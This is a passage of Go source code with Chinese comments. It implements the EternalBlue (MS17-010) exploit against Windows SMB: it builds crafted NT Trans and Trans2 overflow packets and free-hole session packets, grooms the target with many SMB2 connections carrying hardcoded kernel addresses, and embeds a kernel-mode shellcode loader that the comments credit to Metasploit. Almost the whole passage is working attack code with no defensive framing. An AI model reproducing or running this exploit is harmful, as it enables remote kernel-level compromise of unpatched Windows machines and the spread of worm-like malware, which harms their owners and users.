	// 获取响应
	_, header, err := smb1GetResponse(conn)
	if err != nil {
		return nil, fmt.Errorf("获取NT Trans响应失败: %v", err)
	}

	return header, nil
}

// writeNetBIOSNTTransHeader 写入NetBIOS会话服务头
func writeNetBIOSNTTransHeader(buf *bytes.Buffer) error {
	// 消息类型
	buf.WriteByte(0x00)
	// 长度
	buf.Write([]byte{0x00, 0x04, 0x38})
	return nil
}

// writeSMBNTTransHeader 写入SMB协议头
func writeSMBNTTransHeader(buf *bytes.Buffer, treeID, userID uint16) error {
	// SMB标识
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// 命令: NT Trans
	buf.WriteByte(0xA0)
	// NT状态码
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 标志位
	buf.WriteByte(0x18)
	// 标志位2
	buf.Write([]byte{0x07, 0xC0})
	// 进程ID高位
	buf.Write([]byte{0x00, 0x00})
	// 签名1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 签名2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 保留字段
	buf.Write([]byte{0x00, 0x00})

	// 树ID
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)

	// 进程ID
	buf.Write([]byte{0xFF, 0xFE})

	// 用户ID
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)

	// 多路复用ID
	buf.Write([]byte{0x40, 0x00})
	return nil
}

// writeNTTransRequest 写入NT Trans请求
func writeNTTransRequest(buf *bytes.Buffer) error {
	// 字段数
	buf.WriteByte(0x14)
	// 最大设置数
	buf.WriteByte(0x01)
	// 保留字段
	buf.Write([]byte{0x00, 0x00})
	// 总参数数
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// 总数据数
	buf.Write([]byte{0xd0, 0x03, 0x01, 0x00})
	// 最大参数数
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// 最大数据数
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 参数数
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// 参数偏移
	buf.Write([]byte{0x4B, 0x00, 0x00, 0x00})
	// 数据数
	buf.Write([]byte{0xd0, 0x03, 0x00, 0x00})
	// 数据偏移
	buf.Write([]byte{0x68, 0x00, 0x00, 0x00})
	// 设置数
	buf.WriteByte(0x01)
	// 未知功能
	buf.Write([]byte{0x00, 0x00})
	// 未知NT事务设置
	buf.Write([]byte{0x00, 0x00})
	// 字节数
	buf.Write([]byte{0xEC, 0x03})

	// NT参数
	buf.Write(makeZero(0x1F))
	// 未文档化字段
	buf.WriteByte(0x01)
	buf.Write(makeZero(0x03CD))

	return nil
}

// makeSMB1Trans2ExploitPacket 创建SMB1 Trans2利用数据包
func makeSMB1Trans2ExploitPacket(treeID, userID uint16, timeout int, typ string) []byte {
	// 计算超时值
	timeout = timeout*0x10 + 3
	buf := bytes.Buffer{}

	// 构造NetBIOS会话服务头
	writeNetBIOSTrans2Header(&buf)

	// 构造SMB协议头
	writeSMBTrans2Header(&buf, treeID, userID)

	// 构造Trans2请求
	writeTrans2RequestHeader(&buf, timeout)

	// 根据类型添加特定数据
	writeTrans2PayloadByType(&buf, typ)

	return buf.Bytes()
}

// writeNetBIOSTrans2Header 写入NetBIOS会话服务头
func writeNetBIOSTrans2Header(buf *bytes.Buffer) {
	// 消息类型
	buf.WriteByte(0x00)
	// 长度
	buf.Write([]byte{0x00, 0x10, 0x35})
}

// writeSMBTrans2Header 写入SMB协议头
func writeSMBTrans2Header(buf *bytes.Buffer, treeID, userID uint16) {
	// SMB标识
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Trans2请求
	buf.WriteByte(0x33)
	// NT状态码
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 标志位
	buf.WriteByte(0x18)
	// 标志位2
	buf.Write([]byte{0x07, 0xC0})
	// 进程ID高位
	buf.Write([]byte{0x00, 0x00})
	// 签名1和2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// 保留字段
	buf.Write([]byte{0x00, 0x00})

	// 树ID
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)

	// 进程ID
	buf.Write([]byte{0xFF, 0xFE})

	// 用户ID
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)

	// 多路复用ID
	buf.Write([]byte{0x40, 0x00})
}

// writeTrans2RequestHeader 写入Trans2请求头
func writeTrans2RequestHeader(buf *bytes.Buffer, timeout int) {
	// 字段数
	buf.WriteByte(0x09)
	// 总参数数
	buf.Write([]byte{0x00, 0x00})
	// 总数据数
	buf.Write([]byte{0x00, 0x10})
	// 最大参数数
	buf.Write([]byte{0x00, 0x00})
	// 最大数据数
	buf.Write([]byte{0x00, 0x00})
	// 最大设置数
	buf.WriteByte(0x00)
	// 保留字段
	buf.WriteByte(0x00)
	// 标志位
	buf.Write([]byte{0x00, 0x10})
	// 超时设置
	buf.Write([]byte{0x35, 0x00, 0xD0})
	buf.WriteByte(byte(timeout))
	// 保留字段
	buf.Write([]byte{0x00, 0x00})
	// 参数数
	buf.Write([]byte{0x00, 0x10})
}

// writeTrans2PayloadByType 根据类型写入负载数据
func writeTrans2PayloadByType(buf *bytes.Buffer, typ string) {
	switch typ {
	case "exploit":
		writeExploitPayload(buf)
	case "zero":
		writeZeroPayload(buf)
	default:
		// 默认填充
		buf.Write(bytes.Repeat([]byte{0x41}, 4096))
	}
}

// writeExploitPayload 写入exploit类型负载
func writeExploitPayload(buf *bytes.Buffer) {
	// 溢出数据
	buf.Write(bytes.Repeat([]byte{0x41}, 2957))
	buf.Write([]byte{0x80, 0x00, 0xA8, 0x00})

	// 固定格式数据
	buf.Write(makeZero(0x10))
	buf.Write([]byte{0xFF, 0xFF})
	buf.Write(makeZero(0x06))
	buf.Write([]byte{0xFF, 0xFF})
	buf.Write(makeZero(0x16))

	// x86地址
	buf.Write([]byte{0x00, 0xF1, 0xDF, 0xFF})
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x20, 0xF0, 0xDF, 0xFF})

	// x64地址
	buf.Write([]byte{0x00, 0xF1, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})

	// 后续数据
	writeExploitTrailingData(buf)
}

// writeExploitTrailingData 写入exploit类型的尾部数据
func writeExploitTrailingData(buf *bytes.Buffer) {
	buf.Write([]byte{0x60, 0x00, 0x04, 0x10})
	buf.Write(makeZero(0x04))
	buf.Write([]byte{0x80, 0xEF, 0xDF, 0xFF})
	buf.Write(makeZero(0x04))
	buf.Write([]byte{0x10, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.Write([]byte{0x18, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.Write(makeZero(0x10))
	buf.Write([]byte{0x60, 0x00, 0x04, 0x10})
	buf.Write(makeZero(0x0C))
	buf.Write([]byte{0x90, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x80, 0x10})
	buf.Write(makeZero(0x0E))
	buf.Write([]byte{0x39, 0xBB})
	buf.Write(bytes.Repeat([]byte{0x41}, 965))
}

// writeZeroPayload 写入zero类型负载
func writeZeroPayload(buf *bytes.Buffer) {
	buf.Write(makeZero(2055))
	buf.Write([]byte{0x83, 0xF3})
	buf.Write(bytes.Repeat([]byte{0x41}, 2039))
}

// makeSMB1EchoPacket 创建SMB1 Echo数据包
func makeSMB1EchoPacket(treeID, userID uint16) []byte {
	buf := bytes.Buffer{}

	// 构造NetBIOS会话服务头
	writeNetBIOSEchoHeader(&buf)

	// 构造SMB协议头
	writeSMBEchoHeader(&buf, treeID, userID)

	// 构造Echo请求
	writeEchoRequest(&buf)

	return buf.Bytes()
}

// writeNetBIOSEchoHeader 写入NetBIOS会话服务头
func writeNetBIOSEchoHeader(buf *bytes.Buffer) {
	// 消息类型
	buf.WriteByte(0x00)
	// 长度
	buf.Write([]byte{0x00, 0x00, 0x31})
}

// writeSMBEchoHeader 写入SMB协议头
func writeSMBEchoHeader(buf *bytes.Buffer, treeID, userID uint16) {
	// SMB标识
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Echo命令
	buf.WriteByte(0x2B)
	// NT状态码
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 标志位
	buf.WriteByte(0x18)
	// 标志位2
	buf.Write([]byte{0x07, 0xC0})
	// 进程ID高位
	buf.Write([]byte{0x00, 0x00})
	// 签名1和2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// 保留字段
	buf.Write([]byte{0x00, 0x00})

	// 树ID
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)

	// 进程ID
	buf.Write([]byte{0xFF, 0xFE})

	// 用户ID
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)

	// 多路复用ID
	buf.Write([]byte{0x40, 0x00})
}

// writeEchoRequest 写入Echo请求
func writeEchoRequest(buf *bytes.Buffer) {
	// 字段数
	buf.WriteByte(0x01)
	// Echo计数
	buf.Write([]byte{0x01, 0x00})
	// 字节数
	buf.Write([]byte{0x0C, 0x00})
	// Echo数据(IDS签名,可置空)
	buf.Write([]byte{0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00})
}

// smb1FreeHole 创建SMB1内存释放漏洞连接
func smb1FreeHole(address string, start bool) (net.Conn, error) {
	// 建立TCP连接
	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("连接目标失败: %v", err)
	}

	// 连接状态标记
	var ok bool
	defer func() {
		if !ok {
			_ = conn.Close()
		}
	}()

	// SMB协议协商
	if err = smbClientNegotiate(conn); err != nil {
		return nil, fmt.Errorf("SMB协议协商失败: %v", err)
	}

	// 根据开始/结束标志设置不同参数
	var flags2, vcNum, nativeOS []byte
	if start {
		flags2 = []byte{0x07, 0xC0}
		vcNum = []byte{0x2D, 0x01}
		nativeOS = []byte{0xF0, 0xFF, 0x00, 0x00, 0x00}
	} else {
		flags2 = []byte{0x07, 0x40}
		vcNum = []byte{0x2C, 0x01}
		nativeOS = []byte{0xF8, 0x87, 0x00, 0x00, 0x00}
	}

	// 构造并发送会话数据包
	packet := makeSMB1FreeHoleSessionPacket(flags2, vcNum, nativeOS)
	if _, err = conn.Write(packet); err != nil {
		return nil, fmt.Errorf("发送内存释放会话数据包失败: %v", err)
	}

	// 获取响应
	if _, _, err = smb1GetResponse(conn); err != nil {
		return nil, fmt.Errorf("获取会话响应失败: %v", err)
	}

	ok = true
	return conn, nil
}

// makeSMB1FreeHoleSessionPacket 创建SMB1内存释放会话数据包
func makeSMB1FreeHoleSessionPacket(flags2, vcNum, nativeOS []byte) []byte {
	buf := bytes.Buffer{}

	// 构造NetBIOS会话服务头
	writeNetBIOSFreeHoleHeader(&buf)

	// 构造SMB协议头
	writeSMBFreeHoleHeader(&buf, flags2)

	// 构造会话设置请求
	writeSessionSetupFreeHoleRequest(&buf, vcNum, nativeOS)

	return buf.Bytes()
}

// writeNetBIOSFreeHoleHeader 写入NetBIOS会话服务头
func writeNetBIOSFreeHoleHeader(buf *bytes.Buffer) {
	// 消息类型
	buf.WriteByte(0x00)
	// 长度
	buf.Write([]byte{0x00, 0x00, 0x51})
}

// writeSMBFreeHoleHeader 写入SMB协议头
func writeSMBFreeHoleHeader(buf *bytes.Buffer, flags2 []byte) {
	// SMB标识
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Session Setup AndX命令
	buf.WriteByte(0x73)
	// NT状态码
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 标志位
	buf.WriteByte(0x18)
	// 标志位2
	buf.Write(flags2)
	// 进程ID高位
	buf.Write([]byte{0x00, 0x00})
	// 签名1和2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// 保留字段
	buf.Write([]byte{0x00, 0x00})
	// 树ID
	buf.Write([]byte{0x00, 0x00})
	// 进程ID
	buf.Write([]byte{0xFF, 0xFE})
	// 用户ID
	buf.Write([]byte{0x00, 0x00})
	// 多路复用ID
	buf.Write([]byte{0x40, 0x00})
}

// writeSessionSetupFreeHoleRequest 写入会话设置请求
func writeSessionSetupFreeHoleRequest(buf *bytes.Buffer, vcNum, nativeOS []byte) {
	// 字段数
	buf.WriteByte(0x0C)
	// 无后续命令
	buf.WriteByte(0xFF)
	// 保留字段
	buf.WriteByte(0x00)
	// AndX偏移
	buf.Write([]byte{0x00, 0x00})
	// 最大缓冲区
	buf.Write([]byte{0x04, 0x11})
	// 最大并发数
	buf.Write([]byte{0x0A, 0x00})
	// VC编号
	buf.Write(vcNum)
	// 会话密钥
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 安全数据长度
	buf.Write([]byte{0x00, 0x00})
	// 保留字段
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// 功能标志
	buf.Write([]byte{0x00, 0x00, 0x00, 0x80})
	// 字节数
	buf.Write([]byte{0x16, 0x00})
	// 原生操作系统
	buf.Write(nativeOS)
	// 额外参数
	buf.Write(makeZero(17))
}

// smb2Grooms 创建多个SMB2连接
func smb2Grooms(address string, grooms int) ([]net.Conn, error) {
	// 创建SMB2头
	header := makeSMB2Header()

	var (
		conns []net.Conn
		ok    bool
	)

	// 失败时关闭所有连接
	defer func() {
		if ok {
			return
		}
		for _, conn := range conns {
			_ = conn.Close()
		}
	}()

	// 建立多个连接
	for i := 0; i < grooms; i++ {
		// 创建TCP连接
		conn, err := net.DialTimeout("tcp", address, 10*time.Second)
		if err != nil {
			return nil, fmt.Errorf("连接目标失败: %v", err)
		}

		// 发送SMB2头
		if _, err = conn.Write(header); err != nil {
			return nil, fmt.Errorf("发送SMB2头失败: %v", err)
		}

		conns = append(conns, conn)
	}

	ok = true
	return conns, nil
}

const (
	packetMaxLen   = 4204 // 数据包最大长度
	packetSetupLen = 497  // 数据包设置部分长度
)

// makeSMB2Header 创建SMB2协议头
func makeSMB2Header() []byte {
	buf := bytes.Buffer{}

	// SMB2协议标识
	buf.Write([]byte{0x00, 0x00, 0xFF, 0xF7, 0xFE})
	buf.WriteString("SMB")

	// 填充剩余字节
	buf.Write(makeZero(124))

	return buf.Bytes()
}

// makeSMB2Body 创建SMB2协议体
func makeSMB2Body(payload []byte) []byte {
	const packetMaxPayload = packetMaxLen - packetSetupLen // 计算最大负载长度
	buf := bytes.Buffer{}

	// 写入填充数据
	writePaddingData(&buf)

	// 写入KI_USER_SHARED_DATA地址
	writeSharedDataAddresses(&buf)

	// 写入负载地址和相关数据
	writePayloadAddresses(&buf)

	// 写入负载数据
	buf.Write(payload)

	// 填充剩余空间(可随机生成)
	buf.Write(makeZero(packetMaxPayload - len(payload)))

	return buf.Bytes()
}

// writePaddingData 写入填充数据
func writePaddingData(buf *bytes.Buffer) {
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x03, 0x00, 0x00, 0x00})
	buf.Write(makeZero(0x1C))
	buf.Write([]byte{0x03, 0x00, 0x00, 0x00})
	buf.Write(makeZero(0x74))
}

// writeSharedDataAddresses 写入共享数据地址
func writeSharedDataAddresses(buf *bytes.Buffer) {
	// x64地址
	x64Address := []byte{0xb0, 0x00, 0xd0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	buf.Write(bytes.Repeat(x64Address, 2))
	buf.Write(makeZero(0x10))

	// x86地址
	x86Address := []byte{0xC0, 0xF0, 0xDF, 0xFF}
	buf.Write(bytes.Repeat(x86Address, 2))
	buf.Write(makeZero(0xC4))
}

// writePayloadAddresses 写入负载地址和相关数据
func writePayloadAddresses(buf *bytes.Buffer) {
	// 负载地址
	buf.Write([]byte{0x90, 0xF1, 0xDF, 0xFF})
	buf.Write(makeZero(0x04))
	buf.Write([]byte{0xF0, 0xF1, 0xDF, 0xFF})
	buf.Write(makeZero(0x40))

	// 附加数据
	buf.Write([]byte{0xF0, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x00, 0x02, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.WriteByte(0x00)
}

// makeZero 创建指定大小的零值字节切片
func makeZero(size int) []byte {
	return bytes.Repeat([]byte{0}, size)
}

// loader 用于在内核模式下运行用户模式shellcode的加载器
// 参考自Metasploit-Framework:
// 文件: msf/external/source/sc/windows/multi_arch_kernel_queue_apc.asm
// 二进制: modules/exploits/windows/smb/ms17_010_eternalblue.rb: def make_kernel_sc
var loader = [...]byte{
	0x31, 0xC9, 0x41, 0xE2, 0x01, 0xC3, 0xB9, 0x82, 0x00, 0x00, 0xC0, 0x0F, 0x32, 0x48, 0xBB, 0xF8,
	0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0x53, 0x04, 0x89, 0x03, 0x48, 0x8D, 0x05, 0x0A,
	0x00, 0x00, 0x00, 0x48, 0x89, 0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x0F, 0x30, 0xC3, 0x0F, 0x01, 0xF8,
	0x65, 0x48, 0x89, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x24, 0x25, 0xA8, 0x01,
	0x00, 0x00, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41,
	0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x6A, 0x2B, 0x65, 0xFF, 0x34, 0x25, 0x10,
	0x00, 0x00, 0x00, 0x41, 0x53, 0x6A, 0x33, 0x51, 0x4C, 0x89, 0xD1, 0x48, 0x83, 0xEC, 0x08, 0x55,
	0x48, 0x81, 0xEC, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8D, 0xAC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48,
	0x89, 0x9D, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xBD, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xB5,
	0xD0, 0x00, 0x00, 0x00, 0x48, 0xA1, 0xF8, 0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x89,
	0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x48, 0x31, 0xDB, 0xFF, 0xCB, 0x48, 0x21, 0xD8, 0xB9, 0x82, 0x00,
	0x00, 0xC0, 0x0F, 0x30, 0xFB, 0xE8, 0x38, 0x00, 0x00, 0x00, 0xFA, 0x65, 0x48, 0x8B, 0x24, 0x25,
	0xA8, 0x01, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x78, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,
	0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58, 0x65,
	0x48, 0x8B, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x0F, 0x01, 0xF8, 0xFF, 0x24, 0x25, 0xF8, 0x0F,
	0xD0, 0xFF, 0x56, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x53, 0x55, 0x48, 0x89, 0xE5,
	0x66, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8D, 0x35, 0xE3, 0xFF, 0xFF, 0xFF, 0x65,
	0x4C, 0x8B, 0x3C, 0x25, 0x38, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x7F, 0x04, 0x49, 0xC1, 0xEF, 0x0C,
	0x49, 0xC1, 0xE7, 0x0C, 0x49, 0x81, 0xEF, 0x00, 0x10, 0x00, 0x00, 0x49, 0x8B, 0x37, 0x66, 0x81,
	0xFE, 0x4D, 0x5A, 0x75, 0xEF, 0x41, 0xBB, 0x5C, 0x72, 0x11, 0x62, 0xE8, 0x18, 0x02, 0x00, 0x00,
	0x48, 0x89, 0xC6, 0x48, 0x81, 0xC6, 0x08, 0x03, 0x00, 0x00, 0x41, 0xBB, 0x7A, 0xBA, 0xA3, 0x30,
	0xE8, 0x03, 0x02, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x39, 0xF0, 0x77, 0x11, 0x48, 0x8D, 0x90,
	0x00, 0x05, 0x00, 0x00, 0x48, 0x39, 0xF2, 0x72, 0x05, 0x48, 0x29, 0xC6, 0xEB, 0x08, 0x48, 0x8B,
	0x36, 0x48, 0x39, 0xCE, 0x75, 0xE2, 0x49, 0x89, 0xF4, 0x31, 0xDB, 0x89, 0xD9, 0x83, 0xC1, 0x04,
	0x81, 0xF9, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x8D, 0x66, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xF2, 0x89,
	0xCB, 0x41, 0xBB, 0x66, 0x55, 0xA2, 0x4B, 0xE8, 0xBC, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x75, 0xDB,
	0x49, 0x8B, 0x0E, 0x41, 0xBB, 0xA3, 0x6F, 0x72, 0x2D, 0xE8, 0xAA, 0x01, 0x00, 0x00, 0x48, 0x89,
	0xC6, 0xE8, 0x50, 0x01, 0x00, 0x00, 0x41, 0x81, 0xF9, 0xBF, 0x77, 0x1F, 0xDD, 0x75, 0xBC, 0x49,
	0x8B, 0x1E, 0x4D, 0x8D, 0x6E, 0x10, 0x4C, 0x89, 0xEA, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0xE5, 0x24,
	0x11, 0xDC, 0xE8, 0x81, 0x01, 0x00, 0x00, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x8D,
	0x4E, 0x08, 0x49, 0xC7, 0x01, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x31, 0xC0, 0x4C, 0x89, 0xF2, 0x31,
	0xC9, 0x48, 0x89, 0x0A, 0x48, 0xF7, 0xD1, 0x41, 0xBB, 0x4B, 0xCA, 0x0A, 0xEE, 0x48, 0x83, 0xEC,
	0x20, 0xE8, 0x52, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0xC8, 0x00, 0x00, 0x00, 0x49, 0x8B,
	0x3E, 0x48, 0x8D, 0x35, 0xE9, 0x00, 0x00, 0x00, 0x31, 0xC9, 0x66, 0x03, 0x0D, 0xD7, 0x01, 0x00,
	0x00, 0x66, 0x81, 0xC1, 0xF9, 0x00, 0xF3, 0xA4, 0x48, 0x89, 0xDE, 0x48, 0x81, 0xC6, 0x08, 0x03,
	0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x8B, 0x11, 0x4C, 0x29, 0xE2, 0x51, 0x52, 0x48, 0x89, 0xD1,
	0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x26, 0x40, 0x36, 0x9D, 0xE8, 0x09, 0x01, 0x00, 0x00, 0x48,
	0x83, 0xC4, 0x20, 0x5A, 0x59, 0x48, 0x85, 0xC0, 0x74, 0x18, 0x48, 0x8B, 0x80, 0xC8, 0x02, 0x00,
	0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0x83, 0xC2, 0x4C, 0x8B, 0x02, 0x0F, 0xBA, 0xE0, 0x05,
	0x72, 0x05, 0x48, 0x8B, 0x09, 0xEB, 0xBE, 0x48, 0x83, 0xEA, 0x4C, 0x49, 0x89, 0xD4, 0x31, 0xD2,
	0x80, 0xC2, 0x90, 0x31, 0xC9, 0x41, 0xBB, 0x26, 0xAC, 0x50, 0x91, 0xE8, 0xC8, 0x00, 0x00, 0x00,
	0x48, 0x89, 0xC1, 0x4C, 0x8D, 0x89, 0x80, 0x00, 0x00, 0x00, 0x41, 0xC6, 0x01, 0xC3, 0x4C, 0x89,
	0xE2, 0x49, 0x89, 0xC4, 0x4D, 0x31, 0xC0, 0x41, 0x50, 0x6A, 0x01, 0x49, 0x8B, 0x06, 0x50, 0x41,
	0x50, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xAC, 0xCE, 0x55, 0x4B, 0xE8, 0x98, 0x00, 0x00, 0x00,
	0x31, 0xD2, 0x52, 0x52, 0x41, 0x58, 0x41, 0x59, 0x4C, 0x89, 0xE1, 0x41, 0xBB, 0x18, 0x38, 0x09,
	0x9E, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE9, 0x41, 0xBB, 0x22, 0xB7, 0xB3, 0x7D, 0xE8,
	0x74, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0x0D, 0xE2, 0x4D, 0x85, 0xE8, 0x66, 0x00,
	0x00, 0x00, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5E,
	0xC3, 0xE9, 0xB5, 0x00, 0x00, 0x00, 0x4D, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D,
	0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xEC, 0xC3, 0x31, 0xD2,
	0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x12,
	0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x45, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x3C,
	0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xEE, 0x45, 0x39,
	0xD9, 0x75, 0xDA, 0x4C, 0x8B, 0x7A, 0x20, 0xC3, 0x4C, 0x89, 0xF8, 0x41, 0x51, 0x41, 0x50, 0x52,
	0x51, 0x56, 0x48, 0x89, 0xC2, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00,
	0x00, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0x48,
	0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0xE8, 0x78, 0xFF, 0xFF, 0xFF, 0x45, 0x39,
	0xD9, 0x75, 0xEC, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48,
	0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x5E, 0x59,
	0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5B, 0x41, 0x53, 0xFF, 0xE0, 0x56, 0x41, 0x57, 0x55, 0x48,
	0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xDA, 0x16, 0xAF, 0x92, 0xE8, 0x4D, 0xFF, 0xFF,
	0xFF, 0x31, 0xC9, 0x51, 0x51, 0x51, 0x51, 0x41, 0x59, 0x4C, 0x8D, 0x05, 0x1A, 0x00, 0x00, 0x00,
	0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x46, 0x45, 0x1B, 0x22, 0xE8, 0x68, 0xFF, 0xFF, 0xFF,
	0x48, 0x89, 0xEC, 0x5D, 0x41, 0x5F, 0x5E, 0xC3,
}
